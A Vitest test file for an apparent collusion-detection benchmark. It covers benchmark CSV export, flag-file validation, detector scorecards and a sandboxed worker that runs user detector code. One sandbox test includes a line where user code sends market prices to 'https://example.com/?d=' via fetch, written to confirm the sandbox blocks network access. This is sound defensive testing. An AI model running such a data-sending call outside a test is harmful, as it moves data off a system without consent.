import { runInNewContext } from 'node:vm';
import Papa from 'papaparse';
import { describe, expect, it } from 'vitest';
import { benchToCsv, DEFAULT_BENCH, makeBench, ourFlags, parseFlagsCsv, scorecard, toInput } from '../src/core/ownMethod';
import { EXAMPLE_DETECTOR, SANDBOX_SOURCE } from '../src/core/sandbox';

const bench = makeBench({ ...DEFAULT_BENCH, perCase: 20 });

describe('benchmark export', () => {
  it('is deterministic for a seed and differs for another', () => {
    expect(makeBench({ ...DEFAULT_BENCH, perCase: 3 })[5].p).toEqual(makeBench({ ...DEFAULT_BENCH, perCase: 3 })[5].p);
    expect(makeBench({ ...DEFAULT_BENCH, perCase: 3, seed: 1 })[5].p).not.toEqual(makeBench({ ...DEFAULT_BENCH, perCase: 3 })[5].p);
  });
  it('writes one row per market, round and seller, with truth columns', () => {
    const csv = benchToCsv(makeBench({ ...DEFAULT_BENCH, perCase: 2 }));
    const rows = Papa.parse<Record<string, string>>(csv, { header: true, skipEmptyLines: true }).data;
    expect(rows.length).toBe(7 * 2 * 30 * 4);
    expect(Object.keys(rows[0])).toEqual(['market_id', 'case', 'label', 'true_pair', 'round', 'agent', 'price', 'benchmark', 'flagged']);
    expect(rows.find((r) => r.case === 'cartel_talk')!.label).toBe('1');
    expect(rows.find((r) => r.case === 'competitive')!.true_pair).toBe('');
  });
});

describe('flag file', () => {
  const ids = bench.map((m) => m.id);
  const file = (f: (id: string, i: number) => string) => 'market_id,flag\n' + ids.map((id, i) => f(id, i)).join('\n');
  it('accepts a complete file', () => {
    const r = parseFlagsCsv(file((id) => `${id},1`), bench);
    expect(r.errors).toEqual([]);
    expect(r.flags.size).toBe(bench.length);
  });
  it('accepts true/false', () => expect(parseFlagsCsv(file((id) => `${id},true`), bench).errors).toEqual([]));
  it('names the row for a bad flag', () => expect(parseFlagsCsv(file((id, i) => `${id},${i === 3 ? 'maybe' : 0}`), bench).errors[0]).toMatch(/Row 5: flag must be 0 or 1/));
  it('rejects ids from a different benchmark, with a hint', () => {
    expect(parseFlagsCsv('market_id,flag\ncompetitive-999,1', bench).errors[0]).toMatch(/not in the benchmark.*seed/);
  });
  it('rejects missing markets', () => expect(parseFlagsCsv(file((id, i) => (i < 5 ? `${id},0` : '')).replace(/\n+$/, ''), bench).errors.join(' ')).toMatch(/have no flag/));
  it('rejects wrong columns', () => expect(parseFlagsCsv('id,result\na,1', bench).errors[0]).toMatch(/market_id and flag/));
  it('warns on duplicates and keeps the first', () => {
    const r = parseFlagsCsv(file((id) => `${id},1`) + `\n${ids[0]},0`, bench);
    expect(r.flags.get(ids[0])).toBe(1);
    expect(r.warnings[0]).toMatch(/twice/);
  });
});

describe('scorecard', () => {
  it('reproduces the paper pattern for the five built-in detectors (n=100 per case)', () => {
    const b = makeBench({ ...DEFAULT_BENCH, perCase: 100 });
    const card = scorecard(b, ourFlags(b));
    const get = (c: string, k: string) => card.rows.find((r) => r.case === c)!.rates[k];
    expect(get('cartel_static', 'influence')).toBeLessThan(0.2);
    expect(get('cartel_static', 'plus_factor')).toBeLessThan(0.2);
    expect(get('boom_parallel', 'outcome')).toBeGreaterThan(0.9);
    expect(get('cartel_tacit', 'plus_factor')).toBeGreaterThan(0.8);
    expect(card.summary.plus_factor.worstMiss.case).toBe('cartel_static');
    expect(card.summary.outcome.worstFalseAlarm.case).toBe('boom_parallel');
  });
  it('a detector that always flags has TPR 1, FPR 1; one that never flags has 0 and 0', () => {
    const card = scorecard(bench, { all: bench.map(() => 1), none: bench.map(() => 0) });
    expect(card.summary.all).toMatchObject({ tpr: 1, fpr: 1 });
    expect(card.summary.none).toMatchObject({ tpr: 0, fpr: 0 });
  });
});

describe('sandbox worker source', () => {
  /** Run SANDBOX_SOURCE in a bare context that behaves like a worker global. */
  function run(code: string, n = 3) {
    const posted: any[] = [];
    const g: any = { postMessage: (m: any) => posted.push(m), fetch: () => 'NETWORK', XMLHttpRequest: class {}, WebSocket: class {}, importScripts: () => 0 };
    g.self = g;
    runInNewContext(SANDBOX_SOURCE, g);
    g.onmessage({ data: { code, markets: bench.slice(0, n).map(toInput) } });
    return { out: posted[0], g };
  }
  it('runs the example detector', () => {
    const { out } = run(EXAMPLE_DETECTOR);
    expect(out.error).toBeUndefined();
    expect(out.flags).toHaveLength(3);
  });
  it('removes network APIs before user code runs', () => {
    const { out } = run('function detect(m){ return typeof fetch === "undefined" && typeof XMLHttpRequest === "undefined" && typeof WebSocket === "undefined" && typeof importScripts === "undefined"; }');
    expect(out.flags).toEqual([1, 1, 1]);
  });
  it('user code cannot call fetch', () => {
    const { out } = run('function detect(m){ fetch("https://example.com/?d=" + JSON.stringify(m.prices)); return true; }');
    expect(out.error).toMatch(/threw on market 1/);
  });
  it('reports a compile error in plain words', () => expect(run('function detect(m { }').out.error).toMatch(/did not compile/));
  it('asks for a function named detect', () => expect(run('const x = 1;').out.error).toMatch(/Define a function named detect/));
  it('rejects a non-boolean return and names the market', () => expect(run('function detect(m){ return "yes"; }').out.error).toMatch(/Market 1: detect must return true, false, 1 or 0/));
  it('reports a thrown error with the market number', () => expect(run('function detect(m){ throw new Error("boom"); }').out.error).toMatch(/threw on market 1: boom/));
});
